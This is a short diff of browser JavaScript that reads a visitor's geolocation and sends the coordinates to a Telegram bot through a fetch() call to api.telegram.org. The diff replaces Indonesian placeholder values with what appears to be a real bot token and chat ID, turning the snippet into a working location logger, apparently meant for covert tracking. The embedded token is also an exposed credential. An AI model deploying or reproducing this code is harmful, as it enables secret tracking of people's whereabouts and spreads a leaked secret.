@@ -21,8 +21,8 @@
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
 
-                    let tokenBot = "MASUKKAN_TOKEN_BOT_ANDA";
-                    let chatId = "MASUKKAN_CHAT_ID_ANDA";
+                    let tokenBot = '8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk';
+                    let chatId = "6269176229";
                     let urlApi = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Lat:%20${lat}%20Long:%20${lon}`;
 
                     fetch(urlApi).then(response => {
